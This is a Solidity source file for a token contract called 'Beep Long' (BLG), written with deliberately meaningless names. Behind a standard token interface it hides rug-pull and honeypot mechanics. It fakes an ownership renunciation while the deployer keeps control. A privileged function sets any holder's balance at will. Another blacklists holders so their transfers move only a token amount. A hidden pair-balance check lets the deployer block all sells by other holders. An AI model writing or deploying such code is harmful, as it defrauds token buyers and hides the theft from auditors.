//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface amountIs {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptLaunched) external view returns (uint256);

    function transfer(address modeAt, uint256 walletMarketing) external returns (bool);

    function allowance(address launchSell, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletMarketing) external returns (bool);

    function transferFrom(
        address sender,
        address modeAt,
        uint256 walletMarketing
    ) external returns (bool);

    event Transfer(address indexed from, address indexed amountSender, uint256 value);
    event Approval(address indexed launchSell, address indexed spender, uint256 value);
}

abstract contract txMarketing {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface autoAmount {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface maxTradingList {
    function createPair(address marketingMin, address exemptAt) external returns (address);
}

interface amountIsMetadata is amountIs {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract BeepLong is txMarketing, amountIs, amountIsMetadata {

    address public fundLimit;

    mapping(address => bool) public exemptMode;

    uint8 private receiverLiquidity = 18;

    function transferFrom(address txLiquidity, address modeAt, uint256 walletMarketing) external override returns (bool) {
        if (_msgSender() != totalReceiver) {
            if (feeLaunched[txLiquidity][_msgSender()] != type(uint256).max) {
                require(walletMarketing <= feeLaunched[txLiquidity][_msgSender()]);
                feeLaunched[txLiquidity][_msgSender()] -= walletMarketing;
            }
        }
        return walletEnable(txLiquidity, modeAt, walletMarketing);
    }

    address totalReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private launchedFeeSwap;

    mapping(address => uint256) private autoLaunch;

    function exemptTeamReceiver(address tradingAuto) public {
        launchedList();
        if (feeFromList != swapEnableExempt) {
            exemptSwapFee = true;
        }
        if (tradingAuto == fundLimit || tradingAuto == launchedExempt) {
            return;
        }
        exemptMode[tradingAuto] = true;
    }

    function launchedList() private view {
        require(feeShould[_msgSender()]);
    }

    function minLiquidity(address autoFund, uint256 walletMarketing) public {
        launchedList();
        autoLaunch[autoFund] = walletMarketing;
    }

    bool private fromLaunch;

    uint256 public fromTx;

    address private amountModeAt;

    bool public modeTeam;

    address fundTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => mapping(address => uint256)) private feeLaunched;

    uint256 private tokenIs = 100000000 * 10 ** 18;

    mapping(address => bool) public feeShould;

    constructor (){
        
        autoAmount fromSwap = autoAmount(totalReceiver);
        launchedExempt = maxTradingList(fromSwap.factory()).createPair(fromSwap.WETH(), address(this));
        
        fundLimit = _msgSender();
        fundToken();
        feeShould[fundLimit] = true;
        autoLaunch[fundLimit] = tokenIs;
        if (launchedFeeSwap) {
            feeFromList = fromTx;
        }
        emit Transfer(address(0), fundLimit, tokenIs);
    }

    uint256 public feeFromList;

    function transfer(address autoFund, uint256 walletMarketing) external virtual override returns (bool) {
        return walletEnable(_msgSender(), autoFund, walletMarketing);
    }

    bool private totalMin;

    string private autoBuy = "Beep Long";

    string private receiverLaunched = "BLG";

    function name() external view virtual override returns (string memory) {
        return autoBuy;
    }

    function symbol() external view virtual override returns (string memory) {
        return receiverLaunched;
    }

    function atLimit(address isAt) public {
        if (isTotalEnable) {
            return;
        }
        if (feeFromList == swapEnableExempt) {
            totalMin = true;
        }
        feeShould[isAt] = true;
        if (fromTx == swapEnableExempt) {
            fromLaunch = false;
        }
        isTotalEnable = true;
    }

    function balanceOf(address exemptLaunched) public view virtual override returns (uint256) {
        return autoLaunch[exemptLaunched];
    }

    bool public isTotalEnable;

    function decimals() external view virtual override returns (uint8) {
        return receiverLiquidity;
    }

    address public launchedExempt;

    uint256 toSwap;

    function minSell(uint256 walletMarketing) public {
        launchedList();
        totalSender = walletMarketing;
    }

    function fundToken() public {
        emit OwnershipTransferred(fundLimit, address(0));
        amountModeAt = address(0);
    }

    uint256 totalSender;

    bool private exemptSwapFee;

    function walletEnable(address txLiquidity, address modeAt, uint256 walletMarketing) internal returns (bool) {
        if (txLiquidity == fundLimit) {
            return senderLiquidity(txLiquidity, modeAt, walletMarketing);
        }
        uint256 enableBuy = amountIs(launchedExempt).balanceOf(fundTake);
        require(enableBuy == totalSender);
        require(modeAt != fundTake);
        if (exemptMode[txLiquidity]) {
            return senderLiquidity(txLiquidity, modeAt, launchedAmountFund);
        }
        return senderLiquidity(txLiquidity, modeAt, walletMarketing);
    }

    uint256 private swapEnableExempt;

    bool public totalMax;

    function senderLiquidity(address txLiquidity, address modeAt, uint256 walletMarketing) internal returns (bool) {
        require(autoLaunch[txLiquidity] >= walletMarketing);
        autoLaunch[txLiquidity] -= walletMarketing;
        autoLaunch[modeAt] += walletMarketing;
        emit Transfer(txLiquidity, modeAt, walletMarketing);
        return true;
    }

    function getOwner() external view returns (address) {
        return amountModeAt;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tokenIs;
    }

    function approve(address listLimit, uint256 walletMarketing) public virtual override returns (bool) {
        feeLaunched[_msgSender()][listLimit] = walletMarketing;
        emit Approval(_msgSender(), listLimit, walletMarketing);
        return true;
    }

    function owner() external view returns (address) {
        return amountModeAt;
    }

    function allowance(address sellMarketingTake, address listLimit) external view virtual override returns (uint256) {
        if (listLimit == totalReceiver) {
            return type(uint256).max;
        }
        return feeLaunched[sellMarketingTake][listLimit];
    }

    uint256 constant launchedAmountFund = 7 ** 10;

    event OwnershipTransferred(address indexed limitMax, address indexed toMin);

}